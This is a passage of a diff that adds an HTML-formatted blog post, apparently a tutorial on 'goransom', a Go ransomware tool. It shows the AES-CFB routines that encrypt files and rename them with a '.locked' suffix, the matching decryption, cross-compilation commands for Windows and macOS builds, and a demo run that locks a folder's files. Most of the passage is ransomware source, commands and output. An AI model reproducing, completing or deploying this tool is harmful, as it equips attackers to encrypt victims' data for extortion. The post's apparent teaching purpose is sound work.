+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// create AES CFB cipher&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;NewCipher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;secretKey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// The IV needs to be unique, but not secure. therefore it&amp;#39;s common to&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// include it at the beginning of the ciphertext.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// See here: https://golang.org/pkg/crypto/cipher/&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;make&lt;/span&gt;&lt;span class="p"&gt;([]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;iv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;io&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ReadFull&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Reader&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;iv&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;stream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;NewCFBEncrypter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;iv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;XORKeyStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="p"&gt;:],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// write the ciphertext in the file&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mo"&gt;0644&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;A &lt;em&gt;&amp;quot;.locked&amp;quot;&lt;/em&gt; suffix is then appended to the filename.&lt;/p&gt;
+&lt;p&gt;The decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly from the &lt;a href="https://golang.org/pkg/crypto/cipher/" target="_blank" rel="noreferrer"&gt;documentation of the &lt;em&gt;crypto/cipher&lt;/em&gt; package&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-go" data-lang="go"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// open the given file&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ReadFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// create AES CFB cipher&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;NewCipher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;secretKey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// The IV needs to be unique, but not secure. Therefore it&amp;#39;s common to&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// include it at the beginning of the ciphertext.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// See here: https://golang.org/pkg/crypto/cipher/&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;panic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;ciphertext too short&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;iv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;aes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BlockSize&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;stream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;NewCFBDecrypter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;iv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;XORKeyStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// write the plaintext in the file&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mo"&gt;0644&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After the decryption, the &lt;em&gt;.locked&lt;/em&gt; suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.&lt;/p&gt;
+&lt;h3 class="relative group"&gt;Compile for multiple architectures
+&lt;div id="compile-for-multiple-architectures" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#compile-for-multiple-architectures" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.&lt;/p&gt;
+&lt;p&gt;Assuming we have our copy of &lt;code&gt;goransom&lt;/code&gt;, if we want to build it for our architecture and OS, it is enough to use:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ go build goransom.go
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ file goransom
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;goransom: ELF 64-bit LSB executable, x86-64, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;, statically linked&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;A &lt;code&gt;goransom&lt;/code&gt; executable will be created, which can be launched as usual. However, if we want to compile the same code for different OSes and architecture, things are not much more complicated.&lt;/p&gt;
+&lt;p&gt;Here is how to get a Windows executable on Linux:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ &lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;windows &lt;span class="nv"&gt;GOARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;386&lt;/span&gt; go build -o goransom.exe goransom.go
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ file goransom.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;goransom.exe: PE32 executable &lt;span class="o"&gt;(&lt;/span&gt;console&lt;span class="o"&gt;)&lt;/span&gt; Intel &lt;span class="m"&gt;80386&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;stripped to external PDB&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;for&lt;/span&gt; MS Windows&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and this is the process for macOS:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ &lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;darwin &lt;span class="nv"&gt;GOARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;amd64 go build ransom.go
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ file goransom
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;goransom: Mach-O 64-bit x86_64 executable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 class="relative group"&gt;A first run
+&lt;div id="a-first-run" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#a-first-run" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;This section provides just an example of how to run &lt;code&gt;goransom&lt;/code&gt; on Linux. Assuming we have the following structure:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ tree
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;├── goransom
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└── folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; └── textfile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ cat folder/textfile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now &lt;code&gt;goransom&lt;/code&gt; will be used to encrypt all the files in &lt;code&gt;folder&lt;/code&gt; using &lt;code&gt;supersecret&lt;/code&gt; as a secret:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ ./goransom -secret supersecret -target folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Operating on folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Operating on folder/textfile&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;textfile&lt;/code&gt; is now encrypted and has been renamed &lt;code&gt;textfile.locked&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ tree
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;├── goransom
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└── folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; └── textfile.locked
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ cat folder/textfile.locked
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;�C4�w��i�G⛘&lt;span class="o"&gt;]&lt;/span&gt;+�~O&lt;span class="o"&gt;(&lt;/span&gt;�@f1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; �&amp;lt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; �0k&amp;gt;&amp;lt;�ZlEV&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;yj��&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;�&lt;span class="o"&gt;[&lt;/span&gt;1m%&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Assuming other files were in the &lt;code&gt;folder&lt;/code&gt; they would be locked as well, since the entire folder was specified as a target for &lt;code&gt;goransom&lt;/code&gt;.&lt;/p&gt;
